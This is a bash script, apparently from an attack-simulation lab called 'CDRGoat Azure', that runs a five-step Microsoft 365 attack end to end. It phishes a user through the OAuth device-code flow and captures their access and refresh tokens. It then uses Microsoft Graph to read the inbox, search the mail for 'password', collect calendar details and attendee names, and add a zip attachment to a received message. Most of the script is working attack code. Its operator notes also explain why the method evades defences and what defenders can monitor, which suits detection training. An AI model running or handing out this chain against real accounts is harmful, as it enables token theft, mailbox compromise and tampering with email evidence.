#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===          CDRGoat Azure - Scenario 8              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Phishing campaign — OAuth Device Code flow\n"
  printf "  • Step 2. Post-compromise — Outlook Inbox Access\n"
  printf "  • Step 3. Post-compromise — Inbox Credential Hunting\n"
  printf "  • Step 4. Post-compromise — Calendar Recon\n"
  printf "  • Step 5. Post-compromise — Modify Email (Add Attachment)\n"
}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1a. Phishing campaign — OAuth Device Code flow (request)
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Phishing campaign (OAuth Device Code)  ===" "${RESET}"

step "Launching OAuth Device Code authentication flow"

DEVICE_CLIENT_ID="d3590ed6-52b3-4102-aeff-aad2292ab01c"   # Microsoft first-party (Azure CLI / PowerShell)
DEVICE_RESOURCE="https://graph.microsoft.com"

USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

spin_start "Requesting device code from login.microsoftonline.com"

set +e
DEVICE_CODE_RESP="$(curl -sS -X POST \
  -H "User-Agent: ${USER_AGENT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "client_id=${DEVICE_CLIENT_ID}" \
  --data-urlencode "resource=${DEVICE_RESOURCE}" \
  "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to request device code (curl rc=$CURL_RC)"
  exit 1
fi

if echo "$DEVICE_CODE_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Device code request failed:"
  echo "$DEVICE_CODE_RESP" | jq .
  exit 1
fi

# Extract values
DEVICE_CODE="$(echo "$DEVICE_CODE_RESP" | jq -r '.device_code')"
USER_CODE="$(echo "$DEVICE_CODE_RESP" | jq -r '.user_code')"
VERIFICATION_URL="$(echo "$DEVICE_CODE_RESP" | jq -r '.verification_url')"
EXPIRES_IN="$(echo "$DEVICE_CODE_RESP" | jq -r '.expires_in')"
INTERVAL="$(echo "$DEVICE_CODE_RESP" | jq -r '.interval')"
MESSAGE="$(echo "$DEVICE_CODE_RESP" | jq -r '.message')"

ok "Device code issued successfully"

printf "\n%s%s%s\n" "${BOLD}${YELLOW}" "⚠️  USER ACTION REQUIRED (Simulation successful phishing) ⚠️" "${RESET}"
printf "\n%sIMPORTANT:%s\n" "${BOLD}${RED}" "${RESET}"
printf "  As a victim using incognito mode in your browser do:\n"
printf "   1) Open %s%s%s\n" "${CYAN}" "${VERIFICATION_URL}" "${RESET}"
printf "   2) Enter the code: %s%s%s\n" "${BOLD}${MAGENTA}" "${USER_CODE}" "${RESET}"
printf "   3) Complete authentication + MFA (setup might be needed)\n\n"

printf "      Code expires in  : %s seconds\n\n" "${EXPIRES_IN}"

read -r -p "Press Enter AFTER the victim completes authentication (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1b. Phishing campaign — OAuth Device Code flow (check)
################################################################################
step "Polling token endpoint waiting for victim authentication"

TOKEN_ENDPOINT="https://login.microsoftonline.com/common/oauth2/token"
ACCESS_TOKEN=""
REFRESH_TOKEN=""

while :; do
  spin_start "Waiting for victim authentication"

  set +e
  TOKEN_RESP="$(curl -sS -X POST \
    -H "User-Agent: ${USER_AGENT}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
    --data-urlencode "client_id=${DEVICE_CLIENT_ID}" \
    --data-urlencode "code=${DEVICE_CODE}" \
    --data-urlencode "resource=${DEVICE_RESOURCE}" \
    "${TOKEN_ENDPOINT}")"
  CURL_RC=$?
  set -e
  spin_stop

  if [ $CURL_RC -ne 0 ]; then
    err "Token polling failed (curl rc=$CURL_RC)"
    exit 1
  fi

  # Pending states
  if echo "$TOKEN_RESP" | jq -e '.error' >/dev/null 2>&1; then
    ERROR_CODE="$(echo "$TOKEN_RESP" | jq -r '.error')"

    case "$ERROR_CODE" in
      authorization_pending)
        info "Waiting — victim has not completed authentication yet"
        sleep "$INTERVAL"
        continue
        ;;
      slow_down)
        info "Throttled — slowing polling interval"
        sleep $((INTERVAL + 5))
        continue
        ;;
      expired_token)
        err "Device code expired — phishing attempt failed"
        exit 1
        ;;
      access_denied)
        err "Victim denied the authentication request"
        exit 1
        ;;
      *)
        err "Unexpected OAuth error:"
        echo "$TOKEN_RESP" | jq .
        exit 1
        ;;
    esac
  fi

  ACCESS_TOKEN="$(echo "$TOKEN_RESP" | jq -r '.access_token')"
  REFRESH_TOKEN="$(echo "$TOKEN_RESP" | jq -r '.refresh_token')"
  break
done

ok "OAuth authentication completed — access token received"

################################################################################
# Step 1c. Phishing campaign — OAuth Device Code flow (validation)
################################################################################
step "Analyzing obtained Microsoft Graph token"

TOKEN_PAYLOAD="$(echo "$ACCESS_TOKEN" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"

TENANT_ID="$(echo "$TOKEN_PAYLOAD" | jq -r '.tid')"
USER_OID="$(echo "$TOKEN_PAYLOAD" | jq -r '.oid')"
UPN="$(echo "$TOKEN_PAYLOAD" | jq -r '.upn // .preferred_username')"

info "Authenticated user context:"
printf "  • Tenant ID : %s%s%s\n" "${YELLOW}" "${TENANT_ID}" "${RESET}"
printf "  • User OID  : %s%s%s\n" "${YELLOW}" "${USER_OID}" "${RESET}"
printf "  • UPN       : %s%s%s\n" "${YELLOW}" "${UPN}" "${RESET}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "OAuth Device Code phishing is a powerful initial access technique because:\n\n"
printf "  • ${MAGENTA}No malicious link${RESET}: Victim authenticates on legitimate Microsoft page\n"
printf "  • ${MAGENTA}Bypasses link scanning${RESET}: Email security tools don't flag the microsoft.com URL\n"
printf "  • ${MAGENTA}Works with MFA${RESET}: The victim completes their normal MFA challenge\n"
printf "  • ${MAGENTA}Token theft${RESET}: Attacker receives both access and refresh tokens\n\n"
printf "The refresh token allows long-term access — the attacker can request new\n"
printf "access tokens for different Microsoft APIs without re-authenticating.\n\n"
printf "This technique abuses legitimate OAuth flows, making it difficult to detect\n"
printf "without monitoring for anomalous device code requests or unusual token usage.\n\n"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2. Post-compromise activity — Access Outlook Inbox
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Post-compromise: Outlook Inbox Access  ===" "${RESET}"

step "Validating Microsoft Graph mailbox access"

GRAPH_BASE="https://graph.microsoft.com/v1.0"
INBOX_ENDPOINT="${GRAPH_BASE}/me/mailFolders/Inbox/messages"

# Build Graph query safely
GRAPH_QUERY="\$top=7&\$orderby=receivedDateTime%20desc&\$select=subject,from,receivedDateTime,isRead"

spin_start "Querying last 7 messages from Inbox"

set +e
MAIL_RESP="$(curl -sS -X GET \
  -H "User-Agent: ${USER_AGENT}" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Accept: application/json" \
  "${INBOX_ENDPOINT}?${GRAPH_QUERY}")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to query Inbox (curl rc=$CURL_RC)"
  exit 1
fi

# Graph API error handling
if echo "$MAIL_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Microsoft Graph returned an error while accessing mailbox:"
  echo "$MAIL_RESP" | jq .
  exit 1
fi

MSG_COUNT="$(echo "$MAIL_RESP" | jq '.value | length')"

if [ "$MSG_COUNT" -eq 0 ]; then
  info "Inbox is empty or returned no messages"
else
  ok "Successfully accessed Inbox — ${MSG_COUNT} messages retrieved"
fi

# Store message IDs for later selection in Step 5
declare -a MAIL_IDS=()
declare -a MAIL_SUBJECTS=()
while IFS= read -r line; do
  MAIL_IDS+=("$line")
done < <(echo "$MAIL_RESP" | jq -r '.value[].id')

while IFS= read -r line; do
  MAIL_SUBJECTS+=("$line")
done < <(echo "$MAIL_RESP" | jq -r '.value[].subject // "(no subject)"')

printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "📧 Last Inbox Messages (7)" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"

# Pretty-print messages with numbered IDs
echo "$MAIL_RESP" | jq -r '
  .value | to_entries[] |
  if .value.isRead == false then
    "'"${BOLD}${RED}"'" +
    "[" + ((.key + 1) | tostring) + "] [UNREAD] " + .value.receivedDateTime + "\n" +
    "    From   : " + (.value.from.emailAddress.name // "Unknown") +
    " <" + (.value.from.emailAddress.address // "n/a") + ">\n" +
    "    Subject: " + (.value.subject // "(no subject)") +
    "'"${RESET}"'" + "\n"
  else
    "[" + ((.key + 1) | tostring) + "] [READ  ] " + .value.receivedDateTime + "\n" +
    "    From   : " + (.value.from.emailAddress.name // "Unknown") +
    " <" + (.value.from.emailAddress.address // "n/a") + ">\n" +
    "    Subject: " + (.value.subject // "(no subject)") + "\n"
  end
'

printf "%s\n" "---------------------------------------------------------------------"

ok "Mailbox reconnaissance completed"
info "Note: Message IDs [1-${MSG_COUNT}] saved for use in Step 5"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "With the stolen OAuth token, we accessed the victim's Outlook mailbox.\n"
printf "Microsoft Graph API provides full programmatic access to:\n\n"
printf "  • ${MAGENTA}Inbox/Sent Items${RESET}: Read all email content and attachments\n"
printf "  • ${MAGENTA}Folders${RESET}: Navigate through all mailbox folders\n"
printf "  • ${MAGENTA}Search${RESET}: Query emails by keyword, sender, date, etc.\n\n"
printf "Attackers commonly perform mailbox reconnaissance to:\n"
printf "  • Find credentials shared via email (password resets, welcome emails)\n"
printf "  • Identify business relationships for BEC (Business Email Compromise)\n"
printf "  • Gather intelligence for further attacks\n"
printf "  • Locate sensitive documents and data\n\n"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true


################################################################################
# Step 3. Post-compromise activity — Search Inbox for credentials
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Post-compromise: Inbox Credential Hunting  ===" "${RESET}"

step "Searching mailbox for messages containing keyword: password"

GRAPH_BASE="https://graph.microsoft.com/v1.0"
SEARCH_ENDPOINT="${GRAPH_BASE}/me/messages"

# Graph search query (orderby NOT allowed with $search)
SEARCH_QUERY='"password"'
GRAPH_QUERY="\$search=${SEARCH_QUERY}&\$top=5&\$select=subject,from,receivedDateTime,bodyPreview"

spin_start "Executing Graph search query"

set +e
SEARCH_RESP="$(curl -sS -X GET \
  -H "User-Agent: ${USER_AGENT}" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Accept: application/json" \
  -H "ConsistencyLevel: eventual" \
  "${SEARCH_ENDPOINT}?${GRAPH_QUERY}")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to execute search query (curl rc=$CURL_RC)"
  exit 1
fi

# Graph API error handling
if echo "$SEARCH_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Microsoft Graph returned an error during search:"
  echo "$SEARCH_RESP" | jq .
  exit 1
fi

MATCH_COUNT="$(echo "$SEARCH_RESP" | jq '.value | length')"

if [ "$MATCH_COUNT" -eq 0 ]; then
  info "No messages found containing keyword: password"
  read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
  exit 0
fi

ok "Found ${MATCH_COUNT} message(s) containing keyword: password"

printf "\n%s%s%s\n" "${BOLD}${RED}" "🔍 Potential Credential-Related Messages (latest 2 shown)" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"

# Sort client-side by receivedDateTime DESC and show last 2
echo "$SEARCH_RESP" | jq -r '
  .value
  | sort_by(.receivedDateTime)
  | reverse
  | .[:2][]
  | "• " + (.receivedDateTime) + "\n" +
    "    From   : " + (.from.emailAddress.name // "Unknown") +
    " <" + (.from.emailAddress.address // "n/a") + ">\n" +
    "    Subject: " + (.subject // "(no subject)") + "\n" +
    "    Preview: " + (.bodyPreview // "(empty)") + "\n"
'

printf "%s\n" "---------------------------------------------------------------------"

ok "Mailbox keyword search completed — potential credential exposure identified"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We searched the mailbox for emails containing the keyword 'password'.\n"
printf "This is a common attacker technique to find:\n\n"
printf "  • ${MAGENTA}Password reset emails${RESET}: Temporary credentials from IT support\n"
printf "  • ${MAGENTA}Welcome/onboarding emails${RESET}: Initial credentials for new accounts\n"
printf "  • ${MAGENTA}Shared credentials${RESET}: Passwords shared between colleagues\n"
printf "  • ${MAGENTA}Service accounts${RESET}: API keys or service credentials\n\n"
printf "Common search terms attackers use:\n"
printf "  • 'password', 'credential', 'secret', 'API key'\n"
printf "  • 'login', 'username', 'account'\n"
printf "  • 'SSN', 'credit card', 'bank account'\n\n"
printf "This highlights why ${YELLOW}email should never contain plaintext credentials${RESET}.\n\n"

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. Post-compromise activity — Calendar reconnaissance
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Post-compromise: Calendar Recon  ===" "${RESET}"

step "Querying calendar for upcoming meetings (next 10 days)"

GRAPH_BASE="https://graph.microsoft.com/v1.0"
CALENDAR_ENDPOINT="${GRAPH_BASE}/me/calendarView"

START_TIME="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
END_TIME="$(date -u -d "+10 days" +"%Y-%m-%dT%H:%M:%SZ")"

GRAPH_QUERY="startDateTime=${START_TIME}&endDateTime=${END_TIME}&\
\$top=3&\
\$orderby=start/dateTime&\
\$select=subject,organizer,attendees,start,end,onlineMeeting,bodyPreview"

spin_start "Fetching upcoming calendar events"

set +e
CAL_RESP="$(curl -sS -X GET \
  -H "User-Agent: ${USER_AGENT}" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Accept: application/json" \
  "${CALENDAR_ENDPOINT}?${GRAPH_QUERY}")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to query calendar (curl rc=$CURL_RC)"
  exit 1
fi

# Graph API error handling
if echo "$CAL_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Microsoft Graph returned an error while accessing calendar:"
  echo "$CAL_RESP" | jq .
  exit 1
fi

EVENT_COUNT="$(echo "$CAL_RESP" | jq '.value | length')"

if [ "$EVENT_COUNT" -eq 0 ]; then
  info "No meetings scheduled in the next 10 days"
  read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
  exit 0
fi

ok "Retrieved ${EVENT_COUNT} upcoming meeting(s)"

printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "📅 Upcoming Meetings (next 10 days)" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"

# Pretty-print meetings (meeting links redacted for security)
echo "$CAL_RESP" | jq -r '
  .value[] |
  (
    "• " + (.subject // "(no subject)") + "\n" +
    "    When      : " + .start.dateTime + " → " + .end.dateTime + "\n" +
    "    Organizer : " + (.organizer.emailAddress.name // "Unknown") + "\n" +
    "    Attendees : " +
      (
        .attendees
        | map(.emailAddress.name // "Unknown")
        | .[:5]
        | join(", ")
      ) +
      (if (.attendees | length) > 5 then " …" else "" end) + "\n" +
    "    Meeting   : " +
      (
        if .onlineMeeting.joinUrl then
          "<REDACTED>"
        elif (.bodyPreview | test("https?://")) then
          "<REDACTED>"
        else
          "n/a"
        end
      ) + "\n"
  )
'

printf "%s\n" "---------------------------------------------------------------------"

ok "Calendar reconnaissance completed"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Calendar reconnaissance provides valuable intelligence for attackers:\n\n"
printf "  • ${MAGENTA}Meeting schedules${RESET}: Know when target is busy/available\n"
printf "  • ${MAGENTA}Attendee lists${RESET}: Identify key personnel, executives, partners\n"
printf "  • ${MAGENTA}Meeting links${RESET}: Join calls uninvited (if links not protected)\n"
printf "  • ${MAGENTA}Travel plans${RESET}: Out-of-office periods for physical attacks\n"
printf "  • ${MAGENTA}Project names${RESET}: Internal codenames and initiatives\n\n"
printf "This information enables more targeted attacks:\n"
printf "  • Spear phishing with internal meeting context\n"
printf "  • Impersonating executives during key meetings\n"
printf "  • Social engineering with insider knowledge\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5. Post-compromise activity — Modify email (rare behavior)
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Post-compromise: Modify Email (Add Attachment)  ===" "${RESET}"

step "Select email to modify from Step 2 list"

# Check if we have stored mail IDs from Step 2
if [ ${#MAIL_IDS[@]} -eq 0 ]; then
  err "No emails available from Step 2 — cannot proceed"
  exit 1
fi

# Display available emails for selection
printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "📧 Available Emails for Modification" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"
for i in "${!MAIL_IDS[@]}"; do
  idx=$((i + 1))
  printf "  [%s%d%s] %s\n" "${YELLOW}" "${idx}" "${RESET}" "${MAIL_SUBJECTS[$i]}"
done
printf "%s\n" "---------------------------------------------------------------------"

# Prompt user to select email
while true; do
  printf "\n%s%s%s" "${BOLD}${YELLOW}" "Enter the number [1-${#MAIL_IDS[@]}] of the email to add attachment to: " "${RESET}"
  read -r MAIL_SELECTION
  
  # Validate input
  if [[ ! "$MAIL_SELECTION" =~ ^[0-9]+$ ]]; then
    err "Invalid input. Please enter a number between 1 and ${#MAIL_IDS[@]}"
    continue
  fi
  
  if [ "$MAIL_SELECTION" -lt 1 ] || [ "$MAIL_SELECTION" -gt ${#MAIL_IDS[@]} ]; then
    err "Invalid selection. Please enter a number between 1 and ${#MAIL_IDS[@]}"
    continue
  fi
  
  break
done

# Get selected message ID and subject (array is 0-indexed)
SELECTED_IDX=$((MAIL_SELECTION - 1))
MSG_ID="${MAIL_IDS[$SELECTED_IDX]}"
MSG_SUBJECT="${MAIL_SUBJECTS[$SELECTED_IDX]}"

ok "Selected email for modification"
printf "  • Selection: %s[%d]%s\n" "${YELLOW}" "${MAIL_SELECTION}" "${RESET}"
printf "  • Subject  : %s%s%s\n" "${YELLOW}" "${MSG_SUBJECT}" "${RESET}"

################################################################################
# Create attachment payload
################################################################################
step "Creating simulated attachment payload"

# Generate timestamp-based filename
TIMESTAMP="$(date +"%Y_%m_%d-%H_%M_%S")"
ATTACH_FILENAME="${TIMESTAMP}-phish-upload.zip"

WORKDIR="$(mktemp -d)"
TXT_FILE="${WORKDIR}/payload.txt"
ZIP_FILE="${WORKDIR}/${ATTACH_FILENAME}"

echo "This is simulation of modification inbox email" > "${TXT_FILE}"

if ! command -v zip >/dev/null 2>&1; then
  err "zip utility not found — required for Step 5"
  exit 1
fi

zip -j "${ZIP_FILE}" "${TXT_FILE}" >/dev/null

ATTACH_B64="$(base64 -w 0 "${ZIP_FILE}")"
ATTACH_SIZE="$(stat -c%s "${ZIP_FILE}" 2>/dev/null || stat -f%z "${ZIP_FILE}")"

ok "Attachment prepared (${ATTACH_FILENAME}, ${ATTACH_SIZE} bytes)"

################################################################################
# Add attachment to existing email (VERY RARE attacker behavior)
################################################################################
step "Adding attachment to selected email"

ATTACH_ENDPOINT="${GRAPH_BASE}/me/messages/${MSG_ID}/attachments"

ATTACH_PAYLOAD="$(jq -n \
  --arg name "${ATTACH_FILENAME}" \
  --arg b64 "${ATTACH_B64}" \
  --argjson size "${ATTACH_SIZE}" \
  '{
    "@odata.type": "#microsoft.graph.fileAttachment",
    "name": $name,
    "contentType": "application/zip",
    "size": $size,
    "contentBytes": $b64
  }')"

spin_start "Uploading attachment to message"

set +e
ATTACH_RESP="$(curl -sS -X POST \
  -H "User-Agent: ${USER_AGENT}" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Accept: application/json" \
  -H "Content-Type: application/json" \
  -d "${ATTACH_PAYLOAD}" \
  "${ATTACH_ENDPOINT}")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to add attachment (curl rc=$CURL_RC)"
  exit 1
fi

if echo "$ATTACH_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Microsoft Graph returned an error while adding attachment:"
  echo "$ATTACH_RESP" | jq .
  exit 1
fi

ok "Attachment successfully added to selected email"

################################################################################
# Cleanup
################################################################################
rm -rf "${WORKDIR}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Adding an attachment to an existing email is ${RED}very rare attacker behavior${RESET}.\n"
printf "This action generates distinctive signals in Microsoft 365 audit logs:\n\n"
printf "  • ${MAGENTA}MailItemsAccessed${RESET}: Email access with modification intent\n"
printf "  • ${MAGENTA}FileUploaded${RESET}: Attachment upload to existing message\n"
printf "  • ${MAGENTA}Update${RESET}: Message modification event\n\n"
printf "Legitimate users rarely modify received emails.\n"
printf "This behavior pattern should trigger high-confidence alerts.\n\n"
printf "Detection opportunities:\n"
printf "  • Monitor for attachment additions to received (non-draft) emails\n"
printf "  • Alert on programmatic mailbox access via Graph API\n"
printf "  • Correlate device code authentication with subsequent mailbox activity\n\n"

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. OAuth Device Code phishing — obtained victim's tokens\n"
printf "  2. Mailbox access — enumerated recent emails\n"
printf "  3. Credential hunting — searched for sensitive keywords\n"
printf "  4. Calendar reconnaissance — gathered meeting intelligence\n"
printf "  5. Email modification — added attachment (rare behavior)\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Full access to victim's mailbox (read/write)\n"
printf "  • Potential credential theft from email content\n"
printf "  • Business intelligence from calendar\n"
printf "  • Ability to modify/forge email evidence\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • Unusual OAuth device code requests\n"
printf "  • Graph API access to mailbox from new locations/devices\n"
printf "  • Keyword searches in mailbox (password, credential, etc.)\n"
printf "  • Modifications to received emails (attachments, content)\n\n"

printf "%s%s%s\n" "${YELLOW}" "📬 Please check the victim's mailbox to verify the attachment was added." "${RESET}"
printf "%s\n\n" "    Open the selected email and confirm the ZIP attachment is present."
